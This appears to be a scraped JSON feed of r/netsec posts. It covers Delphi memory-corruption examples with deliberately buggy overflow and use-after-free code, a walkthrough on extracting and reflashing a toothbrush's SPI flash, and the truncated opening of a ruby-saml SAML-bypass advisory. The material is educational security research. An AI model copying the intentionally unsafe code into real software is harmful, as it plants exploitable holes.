Create obj2 (occupies the same memory obj1 did)\n  ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 0 - uninitialized memory\n  obj1.ar[4] := $41;                            // Write to obj1 after it has been freed, actually modifying obj2\n  ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 65 - the value has been overwritten\n  obj2.Free;                                    // Free obj2\nend;\n</pre><p>In the first screenshot, the dialog shows that was equal to 0:</p><p>Then, after was written to, the second dialog shows that the value of  was set to 65 (the decimal representation of ):</p><p>These examples only scratch the surface of how memory corruption vulnerabilities might happen in Delphi code; future research could investigate more potentially dangerous library routines in official or common third-party libraries, how FreePascal behaves compared to Delphi, especially on different platforms (Win64, Linux, etc.), or <a href=\"https://docwiki.embarcadero.com/RADStudio/Athens/en/Memory_Management\">how different heap implementations</a> work to explore exploitability of heap memory corruption.</p><p>Based on what we covered in this blog post, here are some suggestions for Delphi developers:</p><ul><li>Avoid dangerous routines such as , , , and ; whenever they must be used, make sure to carefully check sizes using routines such as .</li><li>Consider enabling the “Runtime errors” flags in the compiler options.</li><li>Be cautious when dynamically creating and freeing objects, paying attention to potentially unexpected code paths that could result in using objects after they have been freed.</li><li>Make sure to initialize newly allocated memory before it is read.</li><li>In general, don’t assume that Delphi as a language is inherently safer than other languages such as C/C++.</li></ul><p>Hopefully these examples begin to demystify Delphi and Object Pascal, and also demonstrate that though memory corruption concepts are most commonly discussed in the context of C/C++, familiar vulnerabilities can be found in other languages as well.</p><h4>Appendix: Listing of Unit1.pas</h4><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">unit Unit1;\n\ninterface\n\nuses\n  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,\n  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls;\n\ntype\n  TForm1 = class(TForm)\n    Button1: TButton;\n    Button2: TButton;\n    Button3: TButton;\n    Button4: TButton;\n    procedure Button1Click(Sender: TObject);\n    procedure Button2Click(Sender: TObject);\n    procedure Button3Click(Sender: TObject);\n    procedure Button4Click(Sender: TObject);\n  private\n    { Private declarations }\n  public\n    { Public declarations }\n  end;\n\n  TMyFirstClass = class(TObject)\n    public\n      ar: Array[0..7] of Byte;\n  end;\n\n  TMySecondClass = class(TObject)\n    public\n      n1: Integer;\n      n2: Integer;\n  end;\n\nvar\n  Form1: TForm1;\n\nimplementation\n\n{$R *.dfm}\n\nprocedure Overflow1;\nvar\n  ar: Array[0..9] of Byte;          // Fixed-length array on the stack\n  i: Integer;\nbegin\n  for i := 0 to 999 do\n  begin\n    ar[i] := $41;                   // Raises an exception if dynamic bounds-checking is enabled\n  end;\nend;                                // If overflow happens, returns to $41414141\n\nprocedure Overflow2;\nvar\n  ar1: Array[0..9] of Byte;        // Smaller array on the stack\n  ar2: Array[0..999] of Byte;      // Larger array on the stack\n  i: Integer;\nbegin\n  for i := 0 to 999 do\n  begin\n    ar2[i] := $41;                 // Fill ar2 with $41\n  end;\n  Move(ar2, ar1, SizeOf(ar2));     // Oops should have been SizeOf(ar1)\nend;                               // Returns to $41414141\n\nprocedure Heap1a;\nvar\n  s: String;                       // Unicode string variable on the stack, contents on the heap\nbegin\n  s := 'Super Secret';             // Assign a value to the string\n  s := s + ' String!';             // Appending to the string re-allocates heap memory\nend;                               // Memory for s is freed as it goes out of scope\n\nprocedure Heap1b;\nvar\n  s: String;                       // Unicode string variable on the stack, contents on the heap\nbegin\n  SetLength(s, 20);                // Trigger re-allocation, does not initialize memory\n  ShowMessage(s);                  // Shows 'Super Secret String!'\nend;\n\nprocedure Heap1c;\nbegin\n  Heap1a;\n  Heap1b;\nend;\n\nprocedure Heap2;\nvar\n  obj1: TMyFirstClass;\n  obj2: TMySecondClass;\nbegin\n  obj1 := TMyFirstClass.Create;                 // Create obj1\n  obj1.Free;                                    // Free obj1\n  obj2 := TMySecondClass.Create;                // Create obj2 (occupies the same memory obj1 did)\n  ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 0 - uninitialized memory\n  obj1.ar[4] := $41;                            // Write to obj1 after it has been freed, actually modifying obj2\n  ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 65 - the value has been overwritten\n  obj2.Free;                                    // Free obj2\nend;\n\nprocedure TForm1.Button1Click(Sender: TObject);\nbegin\n  Overflow1;\nend;\n\nprocedure TForm1.Button2Click(Sender: TObject);\nbegin\n  Overflow2;\nend;\n\nprocedure TForm1.Button3Click(Sender: TObject);\nbegin\n  Heap1c;\nend;\n\nprocedure TForm1.Button4Click(Sender: TObject);\nbegin\n  Heap2;\nend;\n\nend.\n</pre>","contentLength":13800,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1janb9v/memory_corruption_in_delphi/"},{"title":"Brushing Up on Hardware Hacking Part 2 - SPI, UART, Pulseview, and Flashrom","url":"https://voidstarsec.com/blog/brushing-up-part-2","date":1741880453,"author":"/u/wrongbaud","guid":799,"unread":true,"content":"<a href=\"https://voidstarsec.com/blog/\">Home</a><p>In our <a href=\"https://voidstarsec.com/blog/pifex-pigen\">last post</a>, we reviewed how to use the <a href=\"https://github.com/RPi-Distro/pi-gen\">pi-gen</a> tool to generate an image for a Raspberry Pi that is pre-configured with many tools needed for basic hardware hacking. In this post, we will start using them on our first target.</p><p>Our first target from the AliExpress grab bag is going to be this electric toothbrush. Our goal is to extract the firmware and maybe push modified firmware to the toothbrush (there is a statement I never thought I’d type…).</p><p>This toothbrush is an interesting target for several reasons:</p><ol><li>It has a (somewhat) high-res color screen\n    <ol><li>This leads me to believe that whatever is driving it might be somewhat interesting</li></ol></li><li>It has a USB port\n    <ol><li>This might be used just for charging, but there is only one way to find out</li></ol></li><li>There are user presets as well as a “version” screen\n    <ol><li>This might mean some non-volatile storage on board and, more importantly, a firmware update method!</li></ol></li></ol><p>One of the first things we want to do with a new embedded target is perform a visual teardown. During this process, we will identify the various components and potential attack vectors (exposed pins/pads) that we will use to extract information from this device. The visual teardown for this device can be seen in the image/tables below:</p><table><thead><tr></tr></thead><tbody><tr><td>SPI Flash, non-volatile storage</td></tr><tr><td>Standard Linear Li-Ion Battery Charger</td></tr><tr></tr></tbody></table><p>This is a pretty simple target, which makes it great for learning how to do embedded assessments. We have an ARM Cortex MCU, an SPI flash, an IC for managing the charging of the battery, and another IC for controlling the motor. This target also contains a very well-documented silkscreen, which makes our initial analysis much simpler; one thing that likely stuck out to you when examining this PCB was the clearly labeled  and  pads, as we’ve discussed in <a href=\"https://voidstarsec.com/blog/uart-uboot-and-usb\">previous posts</a> this is indicative of a UART. Let’s start by looking at this toothbrush’s UART output.</p><p>If you’ve never looked at UART before or are unfamiliar with the process of identifying one and locating the baud rate, I highly recommend checking out the post I linked previously. It will cover everything you need to know for the following section.</p><p>The first thing we need to do is determine the baud rate; once we have that, we can look at the data being sent over the lines and determine if it is useful to us. Using an oscilloscope, we can monitor this line on startup, which results in the following trace being generated on the scope:</p><p>This does not look promising in terms of debug output. However, If you are familiar with UART, you know that the transmit line must be pulled high as bits are (in a standard configuration) transmitted by driving the line low. We can see in this capture that the line is low. This may lead you to think that the UART is not active and we should move on; before we do that, let’s try one more thing. Using a 10K resistor, we will pull the Tx line high to 3.3V; if we take a capture in this configuration and press a few buttons on the toothbrush, we see the following:</p><p>Success! We have traffic, so the lesson here is not to get discouraged if you don’t immediately see traffic on a UART interface. It is important to rely on your understanding of the protocol fundamentals at a low level, this is something that we focus on at the core of our <a href=\"https://voidstarsec.com/training/\">hardware reverse engineering training</a>.</p><p>Based on the output from the scope, we determine that the baud rate is 115200; this is done by locating the smallest pulse and measuring its frequency. Now that we have this we can connect this to the serial port of the Raspberry Pi and examine the output:</p><div><div><pre><code>KEY_B Down.\nKEY_B Dn-&gt;Up.\nKEY_B Down.\n39F9(8000,9419), \nKEY_B Dn-&gt;Up.\nKEY_B Down.\nKEY_B Dn-&gt;Up.\nKEY_A Down.\n675D(30000,33884), \n4C91(10,3894), 675D(30000,33884), \n</code></pre></div></div><p>So, we have debug output! But this does not get us what we’re looking for. We want to extract the firmware and see if we can re-flash it! For these purposes, we will focus on the main MCU and the SPI flash. Let’s start by looking at the SPI flash.</p><p>If you are unfamiliar with SPI flash chips and how they work, check out some of our previous blog entries <a href=\"https://wrongbaud.github.io/posts/BasicFUN-flashing/\">here</a>.\nIn order to read out this flash we will use <a href=\"https://flashrom.org/\">flashrom</a>. If you are unfamiliar with , it is an open-source tool for reading and writing SPI flash devices. We’ve used this tool in previous posts, and you can learn more about it and see more usage examples <a href=\"https://wrongbaud.github.io/posts/router-teardown/\">here</a></p><p>One of the nice things about  is that we can use it with several hardware adapters. One of the most commonly used is the CH341 adapter, which you can purchase <a href=\"https://www.amazon.com/CH341A-programmer-socket-programer-support/dp/B077GBTWQP\">here</a>. However, you can also use an embedded Linux device with the  kernel module loaded, allowing an SPI peripheral to be accessed through the  directory.</p><p>We can attempt to access the SPI flash using a standard SOIC8 clip (<a href=\"https://www.digikey.com/en/products/detail/pomona-electronics/5250/745102\">pomona</a> are the best) as shown in the diagram:</p><p>Using a Raspberry Pi with the  kernel module enabled, we can attempt to extract the SPI flash as follows:</p><div><div><pre><code>flashrom  linux_spi:dev/dev/spidev0.0  toothbrush-spi.bin\n</code></pre></div></div><ul><li> is used to specify the programmer; on our case this is the SPI peripheral on the Raspberry Pi () located at <ul><li> If you are using something like an FTDI, Tigard, or CH341 programmer, you will want to update this according to your hardware</li></ul></li><li> specifies a read operation followed by the filename that we want to write.</li></ul><p>So, with our clip in place, we should be able to just run it and get access to the SPI data, right? Let’s see what happens:</p><div><div><pre><code>pi@pifex:~/targets/toothbrush $ ./run-flashrom.sh r spi.bin\nflashrom unknown on Linux 6.6.74+rpt-rpi-v8 (aarch64)\nflashrom is free software; get the source code at https://flashrom.org\n\nUsing clock_gettime for delay loops (clk_id: 1, resolution: 1ns).\nUsing default 2000kHz clock. Use 'spispeed' parameter to override.\nNo EEPROM/flash device found.\nNote: flashrom can never write if the flash chip isn't found automatically.\n</code></pre></div></div><p>If you have used  before, errors like this are not new to you, if you have not, don’t fret! Recall that one of the pins we connected to for the SPI flash was the VCC pin. If that pin is also connected to the CPU on board, then we are likely inadvertently powering this CPU and causing it to access the SPI flash while we are trying to read. This will cause bus contention problems as the SPI protocol cannot have two host devices actively trying to access the same target device simultaneously.</p><p>In this scenario, there are several options that we have:</p><ol><li>Remove the SPI flash with a hot air gun\n    <ol><li> Immediately remove the bus contention issues</li><li> Removal/resoldering the device  be risky if you’ve not done this before. If there is any type of anti-tamper on the target device, it may cause issues for us as well</li></ol></li><li>Analyze the SPI traffic using a logic analyzer and reconstruct the data that is read from the CPU to a flash image\n    <ol><li> If the CPU does not address the entire SPI flash, we will not get a full image; also, depending on the system, adding the additional length to the SPI traces by attaching our logic analyzer can cause the CPU not to boot properly. This method also, by definition gives us no write access, so if we want to push modified firmware - we are out of luck</li></ol></li><li>Find a way to keep the CPU in reset or stop communicating with the SPI flash\n    <ol><li> Allows for in-circuit reads</li><li> Based on the PCB layout of your target and your level of access, this may not be possible</li></ol></li></ol><p>Let’s go through all three of these together. For our first example, I have an old blog post <a href=\"https://wrongbaud.github.io/posts/Holiday-Teardown/\">here</a> that walks through the process.</p><h4>Analyzing Data with Pulseview</h4><p>Using the same clip setup as before, we can use a <a href=\"https://www.amazon.com/HiLetgo-Analyzer-Ferrite-Channel-Arduino/dp/B077LSG5P2\">low-cost</a> logic analyzer to view the traffic on startup and during operations:</p><p>After monitoring the SPI traffic on boot, we have the following:</p><p>With this, we can set up an SPI decoder and assign the signals, as shown below. Pulseview also includes protocol-level decoders that we can use to see exactly what commands are being sent to this SPI flash.</p><p>While we know the pins we have connected to on the SPI flash, let’s examine the traffic and see if we can identify them. This skill can be helpful if you are analyzing signals on an undocumented bus or debug header.</p><p> If you would like more of a deep dive into the SPI protocol and how it is used for EEPROMs, check out my old blog post <a href=\"https://voidstarsec.com/blog/**https://wrongbaud.github.io/posts/BasicFUN-flashing/\">here</a></p><p>Serial Peripheral Interface (SPI) requires the following four signals:</p><ul><li>Chip Select: Used to select the target chip</li><li>Clock: Driven by the host to determine when data is sampled</li><li>Serial Data Out (MOSI): Data sent from the host to the target is sent on this line</li><li>Serial Data In (MISO): Used to send data from the device to the host.</li></ul><p>Based on what we know about the SPI protocol, the CS line should stay low during each transaction. This behavior is seen on the D0 line in our screenshot above. Next, we know that a clock signal has to be provided by the bus controller; this will be a consistent pulse that aligns with data being transmitted on the target. The fourth row in the screenshot above demonstrates this. Now, all that is left is the SDI and SDO lines. SDO is driven by the controller and used to issue commands; replies are then sent back to the SDI line.</p><p>If we look closely at our captured signals, we can see that one line is active first (3), which is followed by a response on the other line (2). It is a fair assumption to label the third signal as SDO and the second as SDI; we can set this up in our pulseview decoder as shown below:</p><p>With our decoder set up, we can see the bytes that are being sent and what those bytes mean to the SPI flash:</p><p>One thing to note is that when a read operation is performed (when cycling through the menus) and new data is displayed on screen, we have the following transactions:</p><ul><li>Thirteen read operations, each consisting of 1,921 bytes (24973 bytes total)</li><li>One final read consisting of 641 bytes</li></ul><p>It is a reasonable assumption to say that the data for each image displayed requires roughly 24Kb of data.</p><p>One of the most useful features in Pulseview is the “Binary Decoder Output View.” This window will let you view decoded traffic results and export them to a file. In the following screenshot, we have selected the MISO (SDI) line, which shows the responses from the SPI flash. This contains the data that was transmitted back to the CPU from the flash chip.</p><p>While this gives us some data, the CPU does not read all of the data in one shot; it reads data from this flash as needed. We can see this when we cycle through the menu options, which generates new traffic.</p><p>We need to dig a little deeper to get the full flash image without removing the chip.</p><p>There are several ways for us to disable the CPU on this device:</p><ol><li>Locate a reset pin and pull it low</li><li>Manipulate the external oscillator (if present) to keep the CPU from booting</li><li>Manipulate an external interrupt or boot-mode pin on our target device to force it to boot into a different mode that will not access the SPI flash.</li></ol><p>Luckily for us, this device has multiple labeled test pads, as seen in the image below:</p><p> Reset pins are typically active low, but it is worth checking beforehand with a multi-meter to make sure that we don’t damage anything before pulling something to the ground.</p><p>We can use this pin to hold the processor in reset if we hold the processor in reset and attempt to read out the flash in the same manner as before, we see the following:</p><div><div><pre><code>pi@pifex:~/targets/toothbrush $ ./run-flashrom.sh r spi2.bin\nflashrom unknown on Linux 6.6.74+rpt-rpi-v8 (aarch64)\nflashrom is free software; get the source code at https://flashrom.org\n\nUsing clock_gettime for delay loops (clk_id: 1, resolution: 1ns).\nUsing default 2000kHz clock. Use 'spispeed' parameter to override.\n===\nSFDP has autodetected a flash chip which is not natively supported by flashrom yet.\nAll standard operations (read, verify, erase and write) should work, but to support all possible features we need to add them manually.\nYou can help us by mailing us the output of the following command to flashrom@flashrom.org:\n'flashrom -VV [plus the -p/--programmer parameter]'\nThanks for your help!\n===\nFound Unknown flash chip \"SFDP-capable chip\" (8192 kB, SPI) on linux_spi.\n===\nThis flash part has status UNTESTED for operations: WP\nThe test status of this chip may have been updated in the latest development\nversion of flashrom. If you are running the latest development version,\nplease email a report to flashrom@flashrom.org if any of the above operations\nwork correctly for you with this flash chip. Please include the flashrom log\nfile for all operations you tested (see the man page for details), and mention\nwhich mainboard or programmer you tested in the subject line.\nThanks for your help!\nReading flash... done.\n</code></pre></div></div><p>Now we have a binary image, and we can learn a little more about the internals of this toothbrush.</p><p> When reading a SPI flash chip in-circuit, read it multiple times and check the MD5 of the results. This can confirm that you are getting consistent reads.</p><div><div><pre><code>pi@pifex:~/targets/toothbrush spi.bin \n1dca157fef51ea511c713c933963fa19  spi.bin\npi@pifex:~/targets/toothbrush spi2.bin \n1dca157fef51ea511c713c933963fa19  spi2.bin\n</code></pre></div></div><p>The first step with any unknown binary blob is to run <a href=\"https://github.com/ReFirmLabs/binwalk\">binwalk</a> or <a href=\"https://unblob.org/\">unblob</a> against it; binwalk produces the following:</p><div><div><pre><code>pi@pifex:~/targets/toothbrush $ binwalk spi.bin \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\n</code></pre></div></div><p>If we run strings, we can see some data, but none of it shows up in our debug output. While this could be firmware, if we look at the raw data, we see the following:</p><div><div><pre><code>pi@pifex:~/targets/toothbrush $ hexdump -C -n512 spi.bin \n00000000  00 00 00 00 00 00 00 00  10 a2 6b 6d 94 b2 9c f3  |..........km....|\n00000010  8c 71 52 aa 00 00 00 00  00 00 00 00 00 00 00 00  |.qR.............|\n00000020  00 00 6b 6d ff ff ff ff  ff ff ff ff ff ff ff ff  |..km............|\n00000030  f7 9e 31 a6 00 00 00 00  00 00 00 00 5a eb ff ff  |..1.........Z...|\n00000040  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|\n00000050  21 04 00 00 00 00 00 00  e7 3c ff ff ff ff ce 59  |!........&lt;.....Y|\n00000060  31 86 18 c3 5a cb f7 be  ff ff ff ff a5 34 00 00  |1...Z........4..|\n00000070  00 00 4a 69 ff ff ff ff  ff df 10 82 00 00 00 00  |..Ji............|\n00000080  00 00 52 aa ff ff ff ff  ff df 10 82 21 24 8c 71  |..R.........!$.q|\n00000090  ff ff ff ff ad 55 00 00  00 00 00 00 00 00 00 20  |.....U......... |\n000000a0  ef 7d ff ff ff ff 42 28  4a 69 bd d7 ff ff ff ff  |.}....B(Ji......|\n000000b0  84 10 00 00 00 00 00 00  00 00 00 00 c6 18 ff ff  |................|\n000000c0  ff ff 6b 6d 63 2c d6 9a  ff ff ff ff 63 0c 00 00  |..kmc,......c...|\n000000d0  00 00 00 00 00 00 00 00  ad 75 ff ff ff ff 8c 51  |.........u.....Q|\n000000e0  73 ae de fb ff ff ff ff  5a cb 00 00 00 00 00 00  |s.......Z.......|\n000000f0  00 00 00 00 9c f3 ff ff  ff ff 94 b2 7b cf e7 1c  |............{...|\n00000100  ff ff ff ff 52 aa 00 00  00 00 00 00 00 00 00 00  |....R...........|\n00000110  9c d3 ff ff ff ff 9c d3  73 ae de fb ff ff ff ff  |........s.......|\n00000120  5a cb 00 00 00 00 00 00  00 00 00 00 9c f3 ff ff  |Z...............|\n00000130  ff ff 94 b2 63 2c d6 9a  ff ff ff ff 63 2c 00 00  |....c,......c,..|\n00000140  00 00 00 00 00 00 00 00  ad 75 ff ff ff ff 8c 51  |.........u.....Q|\n00000150  4a 69 bd d7 ff ff ff ff  84 10 00 00 00 00 00 00  |Ji..............|\n00000160  00 00 00 00 c6 18 ff ff  ff ff 6b 6d 21 04 8c 71  |..........km!..q|\n00000170  ff ff ff ff ad 75 00 00  00 00 00 00 00 00 00 20  |.....u......... |\n00000180  f7 9e ff ff ff ff 42 08  00 00 4a 49 ff ff ff ff  |......B...JI....|\n00000190  ff df 10 a2 00 00 00 00  00 00 5a cb ff ff ff ff  |..........Z.....|\n000001a0  ff df 08 61 00 00 00 00  e7 1c ff ff ff ff d6 9a  |...a............|\n000001b0  39 e7 21 04 63 0c f7 be  ff ff ff ff a5 14 00 00  |9.!.c...........|\n000001c0  00 00 00 00 5a cb ff ff  ff ff ff ff ff ff ff ff  |....Z...........|\n000001d0  ff ff ff ff ff ff ff df  18 e3 00 00 00 00 00 00  |................|\n000001e0  00 00 63 2c ff ff ff ff  ff ff ff ff ff ff ff ff  |..c,............|\n000001f0  ef 7d 29 65 00 00 00 00  00 00 00 00 00 00 00 00  |.})e............|\n</code></pre></div></div><p> this were an ARM Cortex firmware image, we would expect to see an Interrupt Vector Table (IVT). On the Cortex-M, the vector table is preceded by a stack pointer, which will point to somewhere in the CPU’s RAM. If we examine the memory map for our processor, we have the following:</p><p>If this were a firmware image for this processor, we would expect to see a pointer to somewhere in the SRAM region and a table pointing to offsets in the internal flash; we do not. We also do not see any data that resembles ARM instructions, so what could this data be?</p><p>Recall that this device has a high-(ish) resolution screen, so this data is likely the image data displayed on startup. For devices with OLED displays, it is rare that the data is stored in a standard image format. It is often stored as pixelated RGB data, which can be difficult to parse. Luckily, there are tools available, such as <a href=\"https://codestation.ch\">https://codestation.ch/</a>, that can allow us to test various formats and parameters.</p><p>This introduces a new problem; we know very little about the formatting being used, so let’s start with what we  know. The width and length of this screen are 11mm by 22mm, which means that our pixel ratio should be similar. Common ratios for these screens include 128x64; however, if we try that, it does not work. After some experimenting, a width of 80 and a height of 160 worked, and I could properly render the images on the screen. See the output below for more details:</p><p>Now that we know the size of the images and the screen layout, we can carve out the various images from the binary and load them as shown below. Using the data that we gathered earlier in pulseview, we know the offsets in the flash where som eof these images are stored.Each image was 24kb pixel maps (remember the read size from before?). Now that they are extracted, we should be able to replace them! After looking through the SPI flash image, it was determined that the bitmap for the software information screen is located at offset  in our SPI flash image. It was individually extracted and loaded as shown below:</p><p>With all of this information, we can generate an RGB file from an 80x160-pixel image file and overwrite the SPI flash with our modified pixel map to display a custom image.</p><p>As a test, let’s take a picture of everyone’s favorite owl (Bubo from Clash of the Titans), scale it to 80x160, and then convert it to RGB565 with .</p><div><div><pre><code>ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb\n</code></pre></div></div><p>This image was injected into the original SPI flash and re-flashed, as shown below:</p><div><div><pre><code>flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin\n</code></pre></div></div><p>Our new image worked, and was displayed properly! We now understand how the SPI flash is structured, but we still have not extracted the firmware. We have one more source: the internal flash on the MCU. In our next post, we’ll discuss how to communicate with an SWD interface and write an OpenOCD config file for a new microcontroller.</p><p>This series aims to show readers that there are many ways to get familiar with embedded systems reverse engineering without breaking the bank and that interesting targets can be found almost anywhere!</p><p>With this post, we’ve talked about:</p><ul><li>Configuring a Raspberry Pi image using the <a href=\"https://github.com/voidstarsec/pifex-sw\">pifex-sw</a> repository and <a href=\"https://github.com/RPi-Distro/pi-gen\">pi-gen</a></li><li>How to identify/instrument a UART even when no signals are active on the PCB</li><li>Multiple methods for in-circuit SPI flash extraction\n    <ul><li>Analyzing SPI traffic with Pulseview</li><li>Extracting SPI flash via </li></ul></li><li>Methods and tools for analyzing image files in an undocumented format</li><li>Reflashing SPI flash chips with flashrom</li></ul><p>Stay tuned for part three for a deep dive into using SWD to reprogram the flash on a microcontroller that is not directly supported by OpenOCD!</p><p>If you want to stay informed about official releases, new courses, and blog posts, sign up for our mailing list <a href=\"http://eepurl.com/hSl31f\">here</a>.</p><div>©&nbsp;2025&nbsp;VoidStar Security LLC\n          &nbsp;\n          •\n          &nbsp;</div>","contentLength":19858,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jaex39/brushing_up_on_hardware_hacking_part_2_spi_uart/"},{"title":"Cradle.sh Open Source Threat Intelligence Hub","url":"https://cradle.sh/","date":1741875626,"author":"/u/small_talk101","guid":811,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jad2e8/cradlesh_open_source_threat_intelligence_hub/"},{"title":"squid: RISC-V emulator for high-performance fuzzing with AOT instead of JIT compilation 🦑","url":"https://github.com/fkie-cad/squid","date":1741862113,"author":"/u/martinclauss","guid":796,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1ja8yg7/squid_riscv_emulator_for_highperformance_fuzzing/"},{"title":"Sign in as anyone: Bypassing SAML SSO authentication with parser differentials","url":"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/","date":1741851224,"author":"/u/ulldma","guid":809,"unread":true,"content":"<blockquote><p>Critical authentication bypass vulnerabilities (CVE-2025-25291 + CVE-2025-25292) were discovered in ruby-saml up to version 1.17.0. Attackers who are in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization can use it to construct SAML assertions themselves and are in turn able to log in as any user. In other words, it could be used for an account takeover attack. Users of ruby-saml should update to version 1.18.0. References to libraries making use of ruby-saml (such as omniauth-saml) need also be updated to a version that reference a fixed version of ruby-saml.</p></blockquote><p>In this blog post, we detail newly discovered authentication bypass vulnerabilities in the <a href=\"https://github.com/SAML-Toolkits/ruby-saml\">ruby-saml</a> library used for single sign-on (SSO) via SAML on the service provider (application) side. GitHub doesn’t currently use ruby-saml for authentication, but began evaluating the use of the library with the intention of using an open source library for SAML authentication once more. This library is, however, used in other popular projects and products. We discovered an exploitable instance of this vulnerability in GitLab, and have notified their security team so they can take necessary actions to protect their users against potential attacks.</p><p>GitHub previously used the ruby-saml library up to 2014, but moved to our own SAML implementation due to missing features in ruby-saml at that time. Following bug bounty reports around vulnerabilities in our own implementation (such as <a href=\"https://docs.github.com/en/enterprise-server@3.13/admin/release-notes#3.13.5-security-fixes\">CVE-2024-9487</a>, related to encrypted assertions), GitHub recently decided to explore the use of ruby-saml again. Then in October 2024, a blockbuster vulnerability dropped: an <a href=\"https://github.com/advisories/GHSA-jw9c-mfg7-9rx2\">authentication bypass</a> in ruby-saml (CVE-2024-45409) by <a href=\"https://hackerone.com/ahacker1\">ahacker1</a>. With tangible evidence of exploitable attack surface, GitHub’s switch to ruby-saml had to be evaluated more thoroughly now. As such, GitHub started a <a href=\"https://hackerone.com/github\">private bug bounty engagement</a> to evaluate the security of the ruby-saml library. We gave selected bug bounty researchers access to GitHub test environments using ruby-saml for SAML authentication. In tandem, the GitHub Security Lab also reviewed the attack surface of the ruby-saml library.</p><p>As is not uncommon when multiple researchers are looking at the same code, both ahacker1, a participant in the <a href=\"https://hackerone.com/github\">GitHub bug bounty program</a>, and I noticed the same thing during code review: ruby-saml was using two different XML parsers during the code path of signature verification. Namely, REXML and Nokogiri. While REXML is an XML parser implemented in pure Ruby, Nokogiri provides an easy-to-use wrapper API around different libraries like libxml2, libgumbo and Xerces (used for JRuby). Nokogiri supports parsing of XML and HTML. It looks like Nokogiri was added to ruby-saml to support <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalization</a> and potentially other things REXML didn’t support at that time.</p><p>We both inspected the same code path in the <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L268\"></a> of  and found that the signature element to be verified is first read via REXML, and then also with Nokogiri’s XML parser. So, if REXML and Nokogiri could be tricked into retrieving different signature elements for the same XPath query it might be possible to trick ruby-saml into verifying the wrong signature. It looked like there could be a potential authentication bypass due to a !</p><p>The reality was actually more complicated than this.</p><p>Roughly speaking, four stages were involved in the discovery of this authentication bypass:</p><ol><li>Discovering that two different XML parsers are used during code review.  </li><li>Establishing if and how a parser differential could be exploited.  </li><li>Finding an actual parser differential for the parsers in use.  </li><li>Leveraging the parser differential to create a full-blown exploit.</li></ol><p>To prove the security impact of this vulnerability, it was necessary to complete all four stages and create a full-blown authentication bypass exploit.</p><h2>Quick recap: how SAML responses are validated<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#quick-recap-how-saml-responses-are-validated\" aria-label=\"Quick recap: how SAML responses are validated\"></a></h2><p>Security assertion markup language (<a href=\"https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language\">SAML</a>) responses are used to transport information about a signed-in user from the identity provider (IdP) to the service provider (SP) in XML format. Often the only important information transported is a username or an email address. When the HTTP POST binding is used, the SAML response travels from the IdP to the SP via the browser of the end user. This makes it obvious why there has to be some sort of signature verification in play to prevent the user from tampering with the message.</p><p>Let’s have a quick look at what a simplified SAML response looks like:<img data-recalc-dims=\"1\" decoding=\"async\" loading=\"lazy\" src=\"https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?resize=1024%2C355\" alt=\"A diagram depicting a simplified SAML response on the left and the verification of the digest and the signature on the right.\" width=\"1024\" height=\"355\" srcset=\"https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=2632 2632w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=300 300w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=768 768w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=1024 1024w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=1536 1536w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=2048 2048w\" sizes=\"auto, (max-width: 1000px) 100vw, 1000px\"></p><p><em>Note: in the response above the XML namespaces were removed for better readability.</em></p><p>As you might have noticed: the main part of a simple SAML response is its assertion element (A), whereas the main information contained in the assertion is the information contained in the  element (B) (here the NameID containing the username: admin). A real assertion typically contains more information (e.g.  and  dates as part of a  element.)</p><p>Normally, the  (A) (without the whole  part) is <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalized</a> and then compared against the  (C) and the  (D) is canonicalized and verified against the  (E). In this sample, the assertion of the SAML response is signed, and in other cases the whole SAML response is signed.</p><h2>Searching for parser differentials<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#searching-for-parser-differentials\" aria-label=\"Searching for parser differentials\"></a></h2><p>We learned that ruby-saml used two different XML parsers (REXML and Nokogiri) for validating the SAML response. Now let’s have a look at the verification of the signature and the digest comparison.\nThe focus of the following explanation lies on the <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L268\"></a> method inside of .</p><p>Inside that method, there’s a broad XPath <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L278C1-L282C8\">query</a> with REXML for the first signature element inside the SAML document:</p><pre><code>sig_element = REXML::XPath.first(\n  